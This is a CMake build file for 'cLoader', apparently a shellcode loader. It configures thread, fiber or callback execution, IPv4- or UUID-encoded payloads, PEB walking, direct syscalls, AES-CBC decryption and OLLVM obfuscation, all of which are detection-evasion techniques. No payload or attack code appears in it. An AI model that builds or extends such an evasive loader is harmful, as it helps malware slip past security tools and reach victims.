# CMakeList.txt: cLoader 的 CMake 项目，在此处包括源代码并定义
# 项目特定的逻辑。
cmake_minimum_required (VERSION 3.8)

# 强化 Release 配置
set(CMAKE_BUILD_TYPE Release)



# -------------------------------
# 执行方式定义
# -------------------------------

# set(EXECUTE_METHOD 1)	这俩调试用。
# set(ENCODE_METHOD 2)

if(EXECUTE_METHOD)
	if(EXECUTE_METHOD EQUAL 1)
		add_compile_definitions (EXECUTE_THREAD)
		message("-- EXECUTE_METHOD=${EXECUTE_METHOD},执行方式为线程")
	elseif(EXECUTE_METHOD EQUAL 2)
		add_compile_definitions (EXECUTE_FIBER)
		message("-- EXECUTE_METHOD=${EXECUTE_METHOD},执行方式为纤程")
	elseif(EXECUTE_METHOD EQUAL 3)
		add_compile_definitions (EXECUTE_CALLBACK)
		message("-- EXECUTE_METHOD=${EXECUTE_METHOD},执行方式为回调")
	endif()
else()
	set(CMAKE_ERROR_DEPRECATED TRUE)
	message(DEPRECATION "-- EXECUTE_METHOD不存在")
endif()

# -------------------------------
# 编码方式定义
# -------------------------------
if(ENCODE_METHOD)
	if(ENCODE_METHOD EQUAL 1)
		add_compile_definitions (ENCODE_IPV4)
		message("-- ENCODE_METHOD=${ENCODE_METHOD},编码方式为ipv4")
	elseif(ENCODE_METHOD EQUAL 2)
		add_compile_definitions (ENCODE_UUID)
		message("-- ENCODE_METHOD=${ENCODE_METHOD},编码方式为uuid")
	endif()
else()
	set(CMAKE_ERROR_DEPRECATED TRUE)
	message(DEPRECATION "-- ENCODE_METHOD不存在")
endif()

# -------------------------------
# 头文件路径 & 汇编支持
# -------------------------------
include_directories(${CMAKE_CURRENT_SOURCE_DIR}/include)
ENABLE_LANGUAGE(ASM_MASM)
set(CMAKE_ASM_MASM_COMPILER "ml64.exe")

# -------------------------------
# 源码文件列表
# -------------------------------
set(SRC_FILES
    src/cLoader.cpp
    src/decrypt.cpp
    src/peb.asm
    src/peb.cpp
    src/syscall.cpp
    src/syscall.x64.asm
    src/cbc.cpp
    src/aes.cpp
)

# -------------------------------
# 可执行目标
# -------------------------------
add_executable(cLoader ${SRC_FILES})

# 设置 C++ 标准
if (CMAKE_VERSION VERSION_GREATER 3.12)
  set_property(TARGET cLoader PROPERTY CXX_STANDARD 20)
endif()

# -------------------------------
# OLLVM 混淆参数（从外部变量传入）
# -------------------------------
# set(OBFUSCATION_FLAGS "-mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf")


if(OBFUSCATION_FLAGS)
    message("-- 已启用混淆，参数 OBFUSCATION_FLAGS=${OBFUSCATION_FLAGS}")

    foreach(file ${SRC_FILES})
        if(file MATCHES "\\.cpp$")
            set_source_files_properties(${file} PROPERTIES COMPILE_FLAGS "${OBFUSCATION_FLAGS}")
        endif()
    endforeach()
else()
    message("-- 未指定 OBFUSCATION_FLAGS，未启用混淆。")
endif()